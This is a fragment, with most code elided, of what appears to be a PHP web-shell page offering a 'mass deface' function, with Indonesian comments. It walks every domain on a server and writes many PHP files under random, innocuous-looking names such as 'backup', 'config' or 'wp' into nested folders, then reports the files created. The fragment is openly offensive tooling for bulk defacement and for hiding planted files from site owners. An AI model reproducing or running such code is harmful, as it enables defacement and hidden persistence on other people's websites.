...
<div class="container">
    ...
    <span class="badge">PHP Only - All files .php</span></center>
    
    <?php
    // ============ FUNGSI UTAMA ============
    
    // Generate nama file PHP random - HANYA .php
    function generateRandomFilename($depth = 0) {
        $prefixes = ['backup', 'temp', 'cache', 'data', 'config', 'system', 'core', 'lib', 'module', 'plugin', 
                     ...
                     'wp', 'admin', 'user', 'api', 'page', 'view', 'model', 'controller'];
    ...
    if (isset($_POST['execmassdeface']) && isset($_POST['massdefaceurl'])) {
        ...
        echo "File Format: <strong>PHP (.php ONLY)</strong> | Depth: " . $maxDepth . " | Copies: " . $copyCount . "<br><br>";
        ...
        foreach ($allDomains as $domainInfo) {
            ...
            foreach ($locations as $location) {
                ...
                for ($i = 0; $i < $copyCount; $i++) {
                    ...
                    // Generate filename PHP - HANYA .php
        ...
        echo "File Format: <strong>PHP (.php ONLY)</strong><br><br>";
        ...
        echo "<strong>📂 Files Created (" . count($filesCreated) . " files - ALL .php):</strong><br>";
            ...
            <tr>
                ...
                <td>
                    <div style="background: #e8f5e9; padding: 10px; border-radius: 4px; color: #2e7d32; font-weight: bold;">
                        ✅ PHP Only - All files use .php extension
                    </div>
                </td>
            </tr>
            <tr>
    ...
    <div style="margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 4px;">
        <small>
            ...
            • <strong>100% PHP Files</strong> - Semua file menggunakan ekstensi .php saja<br>
